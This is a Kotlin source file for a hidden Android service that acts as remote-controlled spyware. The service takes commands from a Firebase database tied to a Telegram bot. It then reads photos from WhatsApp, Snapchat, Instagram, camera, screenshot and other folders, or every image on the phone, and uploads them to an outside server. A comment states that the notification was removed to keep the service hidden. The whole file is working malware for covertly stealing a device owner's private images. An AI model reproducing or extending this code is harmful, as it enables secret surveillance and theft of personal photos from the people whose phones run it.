package com.h4k3r.dreamer

import android.app.*
import android.content.ContentUris
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

class GalleryService : Service() {
    companion object {
        private const val TAG = "GalleryService"
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference
    private var authRetryCount = 0
    private val maxAuthRetries = 10

    /* ── HTTP & Coroutines ──────────────────────── */
    private val server = "https://dreamer-bot.onrender.com"
    private val http = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Gallery Folders ────────────────────────── */
    private val galleryMap = mapOf(
        "whatsapp" to "%WhatsApp/Media/WhatsApp Images%",
        "screenshots" to "%Screenshots%",
        "snapchat" to "%Snapchat%",
        "camera" to "%DCIM/Camera%",
        "instagram" to "%Instagram%",
        "downloads" to "%Download%",
        "telegram" to "%Telegram%",
        "twitter" to "%Twitter%",
        "facebook" to "%Facebook%",
        "all" to "%" // All images
    )

    /* ── Upload Progress Tracking ─────────────────── */
    private var currentUploadJob: Job? = null
    private var uploadProgress = 0
    private var totalToUpload = 0

    override fun onCreate() {
        super.onCreate()

        // Load authentication
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            authRetryCount++
            if (authRetryCount > maxAuthRetries) {
                Log.e(TAG, "Missing authentication, max retries reached. Stopping service.")
                stopSelf()
                return
            }
            Log.e(TAG, "Missing authentication, will retry in 5 seconds (attempt $authRetryCount)")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                onCreate()
            }, 5000)
            return
        } else {
            authRetryCount = 0 // reset on success
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        // Check storage permission
        if (!hasStoragePermission()) {
            Log.w(TAG, "Storage permission denied - stopping service")
            stopSelf()
            return
        }

        // Initialize Firebase reference
        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()
    }

    /* ── Permission Check ───────────────────────── */
    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_MEDIA_IMAGES
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun listenFirebase() {
        deviceRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.child("command").getValue(String::class.java) ?: return
                val chatId = snapshot.child("chat").getValue(Long::class.java) ?: 0L
                val msgId = snapshot.child("msg").getValue(Long::class.java) ?: 0L

                Log.d(TAG, "Command: $cmd")

                when {
                    cmd == "gallery_root" -> sendFolderMenu(chatId, msgId)
                    cmd.startsWith("gallery_") -> {
                        val folder = cmd.removePrefix("gallery_")
                        if (folder != "root") {
                            // Handle custom_ prefix for custom image requests
                            val actualFolder = if (folder.startsWith("custom_")) {
                                folder.removePrefix("custom_")
                            } else {
                                folder
                            }
                            countImages(actualFolder, chatId, msgId)
                        }
                    }
                    cmd.startsWith("gopics_") -> {
                        val parts = cmd.removePrefix("gopics_").split("_", limit = 2)
                        if (parts.size == 2) {
                            val label = parts[0]
                            val count = parts[1].toIntOrNull() ?: 10
                            // Handle custom_ prefix for custom image requests
                            val actualLabel = if (label.startsWith("custom_")) {
                                label.removePrefix("custom_")
                            } else {
                                label
                            }
                            sendImages(actualLabel, count, chatId)
                        }
                    }
                    cmd == "gallery_cancel" -> cancelCurrentUpload()
                    cmd.startsWith("gallery_thumb_") -> {
                        val folder = cmd.removePrefix("gallery_thumb_")
                        sendThumbnails(folder, chatId, msgId)
                    }
                }

                snapshot.child("command").ref.setValue(null)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase error", error.toException())
            }
        })
    }

    /* ── Send Gallery Folders Menu ──────────────── */
    private fun sendFolderMenu(chatId: Long, msgId: Long) {
        Log.d(TAG, "Sending folder menu")

        // Create menu with all available folders
        val folders = galleryMap.keys.filter { it != "all" }.sorted()
        val rows = folders.chunked(2).map { pair ->
            pair.map { folder ->
                mapOf(
                    "text" to "📁 ${folder.replaceFirstChar { it.uppercase() }}",
                    "data" to "gallery_$folder"
                )
            }
        }

        // Add "All Images" option
        val allRows = rows.toMutableList()
        allRows.add(listOf(
            mapOf("text" to "🖼️ All Images", "data" to "gallery_all")
        ))

        // Send to Firebase for Telegram to pick up
        Firebase.database.reference
            .child("temp_gallery_ui")
            .child(deviceId)
            .setValue(mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "type" to "folder_menu",
                "items" to allRows
            ))
    }

    /* ── Count Images in Folder ─────────────────── */
    private fun countImages(label: String, chatId: Long, msgId: Long) {
        Log.d(TAG, "Counting images in: $label")

        scope.launch {
            try {
                val pattern = galleryMap[label] ?: "%$label%"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                val projection = arrayOf(MediaStore.Images.Media._ID)
                val selection = if (label == "all") null else "${MediaStore.Images.Media.DATA} LIKE ?"
                val selectionArgs = if (label == "all") null else arrayOf(pattern)

                val cursor = contentResolver.query(
                    uri,
                    projection,
                    selection,
                    selectionArgs,
                    "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
                )

                val total = cursor?.count ?: 0
                cursor?.close()

                Log.d(TAG, "Found $total images in $label")

                // Get preview images (first 4) - FIXED
                val previews = getPreviewImages(pattern, 4)

                val body = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "folder" to label.replaceFirstChar { it.uppercase() },
                    "total" to total,
                    "previews" to previews
                ))

                postJson("/json/gallerycount", body)

            } catch (e: Exception) {
                Log.e(TAG, "Count error", e)
                sendError(chatId, "Failed to count images: ${e.message}")
            }
        }
    }

    /* ── Get Preview Images - FIXED ─────────────── */
    private fun getPreviewImages(pattern: String, count: Int): List<String> {
        val previews = mutableListOf<String>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        val selection = if (pattern == "%") null else "${MediaStore.Images.Media.DATA} LIKE ?"
        val selectionArgs = if (pattern == "%") null else arrayOf(pattern)

        // FIX: Remove LIMIT from sort order, use Kotlin to limit results
        contentResolver.query(
            uri,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA),
            selection,
            selectionArgs,
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            var processed = 0

            while (cursor.moveToNext() && processed < count) {
                val id = cursor.getLong(idColumn)
                val imageUri = ContentUris.withAppendedId(uri, id)

                try {
                    // Create small thumbnail
                    val thumbnail = createThumbnail(imageUri, 150)
                    thumbnail?.let {
                        val encoded = encodeBitmapToBase64(it)
                        previews.add(encoded)
                        processed++
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Thumbnail error", e)
                }
            }
        }

        return previews
    }

    /* ── Send Images ────────────────────────────── */
    private fun sendImages(label: String, limit: Int, chatId: Long) {
        Log.d(TAG, "Sending $limit images from $label")

        // Cancel any existing upload
        currentUploadJob?.cancel()

        currentUploadJob = scope.launch {
            try {
                uploadProgress = 0
                totalToUpload = limit
                updateUploadNotification()

                val pattern = galleryMap[label] ?: "%$label%"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                val selection = if (label == "all") null else "${MediaStore.Images.Media.DATA} LIKE ?"
                val selectionArgs = if (label == "all") null else arrayOf(pattern)

                contentResolver.query(
                    uri,
                    arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA),
                    selection,
                    selectionArgs,
                    "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
                )?.use { cursor ->
                    val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val pathColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)

                    var sent = 0
                    while (cursor.moveToNext() && sent < limit && isActive) {
                        val id = cursor.getLong(idColumn)
                        val path = cursor.getString(pathColumn)
                        val imageUri = ContentUris.withAppendedId(uri, id)

                        Log.d(TAG, "Uploading image $sent/$limit: $path")

                        if (uploadImage(imageUri, label, sent + 1, limit)) {
                            sent++
                            uploadProgress = sent
                            updateUploadNotification()
                            delay(100)
                        }
                    }
                    Log.d(TAG, "Upload complete: $sent images sent")
                    sendUploadComplete(chatId, sent, label)
                }
            } catch (e: CancellationException) {
                Log.d(TAG, "Upload cancelled")
                sendStatus(chatId, "Upload cancelled")
            } catch (e: Exception) {
                Log.e(TAG, "Send images error", e)
                sendError(chatId, "Failed to send images: ${e.message}")
            } finally {
                uploadProgress = 0
                totalToUpload = 0
                updateUploadNotification()
            }
        }
    }

    /* ── Upload Single Image ────────────────────── */
    private suspend fun uploadImage(uri: Uri, folder: String, current: Int, total: Int): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                // Read image bytes
                val bytes = contentResolver.openInputStream(uri)?.use {
                    it.readBytes()
                } ?: return@withContext false

                // Compress if too large (> 5MB)
                val finalBytes = if (bytes.size > 5 * 1024 * 1024) {
                    compressImage(bytes, 80)
                } else {
                    bytes
                }

                // Create multipart body
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("img", "image.jpg",
                        finalBytes.toRequestBody("image/jpeg".toMediaType())
                    )
                    .addFormDataPart("folder", folder)
                    .addFormDataPart("current", current.toString())
                    .addFormDataPart("total", total.toString())
                    .build()

                val request = Request.Builder()
                    .url("$server/gallery/photo")
                    .header("X-Auth", "$secretKey:$deviceId")
                    .post(body)
                    .build()

                http.newCall(request).execute().use { response ->
                    Log.d(TAG, "Upload response: ${response.code}")
                    response.isSuccessful
                }

            } catch (e: Exception) {
                Log.e(TAG, "Upload error for $uri", e)
                false
            }
        }
    }

    /* ── Image Compression ──────────────────────── */
    private fun compressImage(bytes: ByteArray, quality: Int): ByteArray {
        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        val outputStream = ByteArrayOutputStream()

        // Scale down if too large
        val maxDimension = 2048
        val scaledBitmap = if (bitmap.width > maxDimension || bitmap.height > maxDimension) {
            val scale = minOf(
                maxDimension.toFloat() / bitmap.width,
                maxDimension.toFloat() / bitmap.height
            )
            Bitmap.createScaledBitmap(
                bitmap,
                (bitmap.width * scale).toInt(),
                (bitmap.height * scale).toInt(),
                true
            )
        } else {
            bitmap
        }

        scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)

        if (scaledBitmap != bitmap) {
            scaledBitmap.recycle()
        }
        bitmap.recycle()

        return outputStream.toByteArray()
    }

    /* ── Create Thumbnail ───────────────────────── */
    private fun createThumbnail(uri: Uri, size: Int): Bitmap? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                contentResolver.loadThumbnail(uri, android.util.Size(size, size), null)
            } else {
                contentResolver.openInputStream(uri)?.use { input ->
                    val options = BitmapFactory.Options().apply {
                        inJustDecodeBounds = true
                    }
                    BitmapFactory.decodeStream(input, null, options)

                    options.inSampleSize = calculateInSampleSize(options, size, size)
                    options.inJustDecodeBounds = false

                    contentResolver.openInputStream(uri)?.use { input2 ->
                        BitmapFactory.decodeStream(input2, null, options)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Thumbnail creation error", e)
            null
        }
    }

    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        val height = options.outHeight
        val width = options.outWidth
        var inSampleSize = 1

        if (height > reqHeight || width > reqWidth) {
            val halfHeight = height / 2
            val halfWidth = width / 2
            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2
            }
        }
        return inSampleSize
    }

    private fun encodeBitmapToBase64(bitmap: Bitmap): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
        val bytes = outputStream.toByteArray()
        return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
    }

    /* ── Send Thumbnails Grid ───────────────────── */
    private fun sendThumbnails(folder: String, chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val pattern = galleryMap[folder] ?: "%$folder%"
                val thumbnails = getPreviewImages(pattern, 12) // Get 12 thumbnails

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "folder" to folder,
                    "thumbnails" to thumbnails
                ))

                postJson("/json/gallery_thumbnails", json)
            } catch (e: Exception) {
                Log.e(TAG, "Thumbnail grid error", e)
            }
        }
    }

    /* ── Upload Management ──────────────────────── */
    private fun cancelCurrentUpload() {
        currentUploadJob?.cancel()
        currentUploadJob = null
        uploadProgress = 0
        totalToUpload = 0
        updateUploadNotification()
    }

    private fun updateUploadNotification() {
        // Removed notification to keep service hidden
        // Gallery service runs silently without visible notification
    }

    /* ── Status Messages ────────────────────────── */
    private fun sendUploadComplete(chatId: Long, count: Int, folder: String) {
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "upload_complete",
            "count" to count,
            "folder" to folder,
            "device" to deviceId
        ))
        postJson("/json/gallery_status", json)
    }

    private fun sendStatus(chatId: Long, message: String) {
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "status",
            "message" to message,
            "device" to deviceId
        ))
        postJson("/json/gallery_status", json)
    }

    private fun sendError(chatId: Long, error: String) {
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "error",
            "error" to error,
            "device" to deviceId
        ))
        postJson("/json/gallery_status", json)
    }

    /* ── Network Helper ─────────────────────────── */
    private fun postJson(path: String, json: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
                if (!response.isSuccessful) {
                    Log.e(TAG, "Failed: ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error", e)
        }
    }

    /* ── Service Lifecycle ──────────────────────── */
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        cancelCurrentUpload()
        scope.cancel()
        super.onDestroy()
    }
}